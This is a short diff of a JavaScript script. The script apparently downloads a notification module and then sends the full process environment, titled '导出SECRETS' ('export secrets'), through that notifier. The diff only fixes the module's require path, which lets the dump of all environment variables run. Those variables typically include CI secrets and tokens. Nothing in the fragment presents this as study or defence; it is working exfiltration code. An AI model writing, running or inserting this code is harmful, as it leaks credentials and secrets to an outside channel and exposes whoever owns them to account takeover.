@@ -8,7 +8,7 @@ async function download_notify() {
 }
 async function start() {
     await download_notify();
-    var notify = require("sendNotify");
+    var notify = require("./sendNotify");
     notify.sendNotify("导出SECRETS", JSON.stringify(process.env));
 }
 start();
